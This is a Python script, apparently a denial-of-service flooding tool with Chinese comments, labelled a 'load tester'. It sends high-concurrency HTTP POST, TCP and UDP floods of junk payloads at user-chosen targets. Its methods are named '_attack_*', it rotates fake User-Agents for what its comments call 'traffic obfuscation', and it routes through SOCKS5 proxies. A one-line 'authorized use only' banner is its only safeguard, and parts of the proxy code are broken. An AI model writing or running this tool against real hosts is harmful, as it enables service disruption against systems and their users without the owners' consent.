import asyncio
import socket
import aiohttp
import threading
import random
from tqdm import tqdm
import platform
from colorama import Fore, init
import urllib.parse
import os



# 初始化颜色支持
init(autoreset=True)

# 流量混淆的 User-Agent 列表
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/54.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20130405 Firefox/22.0",
    "Mozilla/5.0 (Windows NT 6.1; rv:24.0) Gecko/20100101 Firefox/24.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
]

class LoadTester:
    """负载测试工具（支持选择协议）Made by Brody-R."""
    def __init__(self, targets, request_size=1024, concurrency=100, timeout=30, protocol="http", proxies=None):
        # 在 __init__ 中接收并存储所有需要的参数
        self.targets = targets
        self.request_size = request_size  # 请求的大小
        self.concurrency = concurrency    # 同时发起的请求数
        self.timeout = timeout            # 请求超时设置
        self.protocol = protocol          # 使用的协议（http, tcp, udp）
        self.proxies = proxies            # 代理配置
        self.total_data_sent = 0          # 记录总共发送的数据量

    def _get_random_user_agent(self):
        """随机选择一个 User-Agent 来进行流量混淆"""
        return random.choice(USER_AGENTS)

    async def _send_http_request(self, session, target):
        """发送单个HTTP请求并读取大量数据以消耗带宽"""
        try:
            headers = {
                "User-Agent": self._get_random_user_agent(),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive"
            }
            data = 'X' * self.request_size
            async with session.post(target, data=data, headers=headers) as resp:
                await resp.read()  # 消耗响应内容以确保请求完成
                self.total_data_sent += len(data)  # 累加发送的数据量
                print(f"HTTP请求 {target} 返回状态码: {resp.status}")
                return True
        except Exception as e:
            print(f"HTTP请求 {target} 失败: {e}")
            return False

    def _send_tcp_request(self, target):
        """发送TCP请求"""
        try:
            # 解析目标URL获取主机名和端口
            parsed_url = urllib.parse.urlparse(target)
            host = parsed_url.hostname
            port = parsed_url.port if parsed_url.port else 80  # 默认端口为 80，如果没有指定

            # 连接到目标服务器
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((host, port))  # 传入元组 (host, port)
                data = 'X' * self.request_size
                s.sendall(data.encode('utf-8'))
                s.close()
                self.total_data_sent += len(data)  # 累加发送的数据量
                print(f"TCP请求 {target} 已发送数据")
        except Exception as e:
            print(f"TCP请求 {target} 失败: {e}")

    def _send_udp_request(self, target):
        """发送UDP请求"""
        try:
            # 解析 URL 获取主机和端口
            parsed_url = urllib.parse.urlparse(target)
            host = parsed_url.hostname
            port = parsed_url.port if parsed_url.port else 80  # 默认端口为 80，如果没有端口指定

            # 解析域名为 IP 地址
            ip = socket.gethostbyname(host)

            # 创建 UDP 套接字并发送数据
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                data = 'X' * self.request_size
                s.sendto(data.encode('utf-8'), (ip, port))  # 发送到目标 IP 和端口
                self.total_data_sent += len(data)  # 累加发送的数据量
                print(f"UDP请求 {target} 已发送数据")
        except Exception as e:
            print(f"UDP请求 {target} 失败: {e}")

    async def _attack_http(self):
        """启动HTTP协议的高并发负载测试"""
        connector = aiohttp.TCPConnector(
            limit_per_host=self.concurrency,
            force_close=True,
            ssl=False
        )

        if self.proxies:
            for proxy in self.proxies:
                connector = aiohttp.TCPConnector(
                    limit_per_host=self.concurrency,
                    force_close=True,
                    ssl=False,
                    proxy=proxy
                )

        async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=self.timeout)) as session:
            tasks = []
            with tqdm(total=self.concurrency, desc=Fore.CYAN + "HTTP负载测试", unit="req") as pbar:
                for _ in range(self.concurrency):
                    for target in self.targets:
                        task = asyncio.create_task(self._send_http_request(session, target))
                        task.add_done_callback(lambda _: pbar.update())
                        tasks.append(task)
                await asyncio.gather(*tasks)

    def _attack_tcp(self):
        """启动TCP协议的高并发负载测试"""
        with tqdm(total=self.concurrency, desc=Fore.CYAN + "TCP负载测试", unit="req") as pbar:
            for target in self.targets:
                for _ in range(self.concurrency):
                    self._send_tcp_request(target)
                    pbar.update()

    def _attack_udp(self):
        """启动UDP协议的高并发负载测试"""
        with tqdm(total=self.concurrency, desc=Fore.CYAN + "UDP负载测试", unit="req") as pbar:
            for target in self.targets:
                for _ in range(self.concurrency):
                    self._send_udp_request(target)
                    pbar.update()

    def start(self):
        """启动负载测试"""
        if self.protocol == "http":
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._attack_http())
        elif self.protocol == "tcp":
            self._attack_tcp()
        elif self.protocol == "udp":
            self._attack_udp()
        else:
            print(Fore.RED + f"不支持的协议: {self.protocol}")
            return

    def run_in_thread(self):
        """使用线程启动负载测试"""
        thread = threading.Thread(target=self.start)
        thread.start()
        thread.join()  # 等待线程结束

    def get_total_data_sent(self):
        """获取总共发送的数据量"""
        return self.total_data_sent

class OperationConsole:
    """操作控制台"""
    @staticmethod
    def config():
        """配置输入"""
        print(Fore.CYAN +
              "=== 高并发负载测试系统 ===Made by Brody R."
              "本工具仅限授权测试使用，使用者需对自身行为负全责 "
              "Authorization: 0x00000000001")
        targets = OperationConsole._input_targets()
        protocol = input(Fore.GREEN + "请选择协议 (http/tcp/udp): ").strip().lower()
        use_proxy = input(Fore.GREEN + "是否使用代理 (y/N): ").strip().lower()
        proxies = None
        if use_proxy == 'y':
            proxy = input(Fore.GREEN + "请输入代理地址 (SOCKS5): ").strip()
            proxies = [proxy]  # 这里假设用户输入的是 SOCKS5 代理地址
        config = {
            'request_size': int(input(Fore.GREEN + "请输入每个请求的数据包大小 (默认: 1024): ").strip() or 1024),
            'concurrency': int(input(Fore.GREEN + "请输入并发请求数 (默认: 100): ").strip() or 100),
            'timeout': int(input(Fore.GREEN + "请输入请求超时时间 (秒) (默认: 30): ").strip() or 30),
            'protocol': protocol,
            'proxies': proxies
        }
        return targets, config

    @staticmethod
    def _input_targets():
        """输入目标地址"""
        targets = []
        print(Fore.GREEN + "\n输入测试目标 (多个目标用回车分隔):")
        while True:
            target = input(Fore.YELLOW + f"目标 {len(targets)+1} (空行结束): ").strip()
            if not target:
                if not targets:
                    print(Fore.RED + "必须指定至少一个目标！")
                    continue
                break
            if '://' not in target:
                target = f'http://{target}'
            targets.append(target)
        return targets

if __name__ == "__main__":
    targets, config = OperationConsole.config()
    tester = LoadTester(
        targets=targets,
        request_size=config['request_size'],  # 每个请求数据包的大小
        concurrency=config['concurrency'],    # 请求的并发数
        timeout=config['timeout'],            # 超时设置
        protocol=config['protocol'],          # 用户选择的协议
        proxies=config['proxies']             # 用户选择的代理
    )
    tester.run_in_thread()
    total_data_sent = tester.get_total_data_sent()
    print(Fore.GREEN + f"\n✅ 所有资源已安全释放")
    print(Fore.CYAN + f"总流量消耗: {total_data_sent / (1024 * 1024):.2f} MB")  # 输出流量消耗（MB）
